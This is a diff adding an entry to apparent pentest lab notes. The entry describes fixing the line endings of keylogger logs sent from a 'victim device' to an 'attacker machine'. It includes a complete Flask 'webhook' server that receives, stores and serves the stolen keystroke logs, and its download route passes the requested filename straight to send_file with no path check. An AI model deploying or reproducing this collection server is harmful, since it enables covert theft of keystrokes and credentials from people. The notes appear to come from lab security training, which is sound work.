@@ -1322,3 +1322,138 @@ exit(0);
 - Two logs recorded.   
 
 **Profit!**
+
+### 16.11.2023
+*Debugging and fixing the keylogger*
+
+Miljonka ran several tests with the keylogger and found out issues.   
+Issues were mostly related to readability of the logfile in attacker machine.   
+Linebreaks werent right and some text didnt display correctly.   
+
+While i was previously strugling with the UTF-8 encoding and stuff, i found out this:   
+
+https://phoenixnap.com/kb/convert-dos-to-unix   
+*Files created in DOS/Windows use carriage return (\\r) and line feed (\\n) for line endings. However, files in Unix/Linux solely use line feed.
+Therefore, when transferring a file from one system to another, make sure to convert the files.*
+
+Final one of the tests, as the initial test was too long to report... Mostly change little bit of this, most of the times without ANY output or loads of errors...     
+
+**Test:**
+- Expected log in server, as the log in victim device was 100% right:   
+```
+Line
+
+Another Line
+
+Third line
+
+ÖÖ ÄÄ ÖÖ ÄÄ !!
+```
+
+- Outcome, server side:   
+```bash
+──(kali🥦kali)-[~/pentest_site]
+└─$ cat log-2.txt 
+ÖÖ ÄÄ ÖÖ ÄÄ !!                                                                                                                 
+┌──(kali🥦kali)-[~/pentest_site]
+└─$ file log-2.txt 
+log-2.txt: Unicode text, UTF-8 (with BOM) text, with CR line terminators
+
+┌──(kali🥦kali)-[~/pentest_site]
+└─$ cat -v log-2.txt 
+M-oM-;M-?Line^M^MAnother Line^M^MThird line^M^MM-CM-^VM-CM-^V M-CM-^DM-CM-^D M-CM-^VM-CM-^V M-CM-^DM-CM-^D !!                                         
+```
+
+Someone could say "this was interesting", but mostly frustrating to me!   
+
+The `^M` had something do with the line endings or something like that...
+But his gave a nice clue, when opening it in `nano` and it displayed it correctly:
+![](notes_res/notes-%2030.png)
+
+So the Keylogger does its own s\*it, Windows its own etc etc...   
+I had tested to previously fix these with `dos2unix` BUT:
+![](notes_res/notes-%2031.png)
+
+Done!   
+But the actual fun part was just ahead! AUTOMATIOOOOOOON!    
+While that is the kind of like foolproof approach, a `tr` is the way to go for hacker and tech minded person!   
+
+Had to do another test run to get the "ugly" log, and use `tr` mentioned also in the previously linked article, to convert the mac line endings to unix style:
+```bash
+tr '\r' '\n' < log-1.txt > log-1_unix.txt
+```
+
+![](notes_res/notes-%2032.png)
+
+Working, but still manual.   
+Easy peasy to add it to the python:
+```python
+if b'\r' in data:
+	data = data.replace(b'\r', b'\n')
+```
+
+
+So the edited `webhook`
+```python
+#!/bin/python3
+from flask import Flask, request, send_file
+import os
+
+app = Flask(__name__)
+
+# Function to get the next available log number
+def get_next_log_number():
+    log_number = 1
+    while os.path.exists(f'log-{log_number}.txt'):
+        log_number += 1
+    return log_number
+
+# Handling POST requests to the '/server' endpoint
+@app.route('/server', methods=['POST'])
+def handle_webhook_post():
+    # Checking if the request method is POST
+    if request.method == 'POST':
+        # Getting the data from the request
+        data = request.data
+
+        # Check if the data contains Mac-style line endings
+        if b'\r' in data:
+            # Replace Mac-style line endings with Unix-style line endings
+            data = data.replace(b'\r', b'\n')
+
+        # Getting the next available log number
+        log_number = get_next_log_number()
+        # Generating the log filename based on the log number
+        log_filename = f'log-{log_number}.txt'
+
+        # Writing the received data to the log file
+        with open(log_filename, 'wb') as file:
+            file.write(data)
+
+        # Returning a response indicating successful receipt and logging of data
+        return f"Webhook data received and logged as {log_filename}", 200
+    else:
+        # Returning a 501 status code for unsupported methods
+        return "Unsupported method", 501
+
+# Handling GET requests to the '/server/<filename>' endpoint
+@app.route('/server/<filename>', methods=['GET'])
+def handle_webhook_get(filename):
+    try:
+        # Sending the specified file as an attachment in the response
+        return send_file(filename, as_attachment=True)
+    except FileNotFoundError:
+        # Returning a 404 status code if the file is not found
+        return "File not found", 404
+
+# Running the Flask app if this script is executed directly
+if __name__ == '__main__':
+    # Configuring the Flask app to run on a specific host and port
+    app.run(host='192.168.66.2', port=80)
+```
+*Note: 192.168.66.2 is still the address of my internal network used in these pentestings.*   
+
+And outcome:   
+![](notes_res/notes-%2033.png)
+
+**Working like it should, again, and for now...**
